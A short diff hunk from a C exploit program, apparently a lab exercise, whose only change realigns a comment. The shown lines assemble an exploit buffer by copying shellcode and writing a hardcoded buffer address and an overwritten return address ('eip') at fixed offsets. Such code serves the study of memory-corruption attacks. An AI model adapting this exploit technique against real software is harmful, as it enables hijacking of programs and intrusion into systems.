@@ -23,7 +23,7 @@ int main(void)
   sploit[4] |= 0x01;
   memcpy(sploit + 8, shellcode, sizeof shellcode - 1);
     
-  *((int *) (sploit + 504)) = 0x804a068; // beginning of p, where we're putting the sploit
+  *((int *) (sploit + 504)) = 0x804a068;  // beginning of p, where we're putting the sploit
   *((int *) (sploit + 508)) = 0xbffffc64; // eip
   
   sploit[512] = '\0';
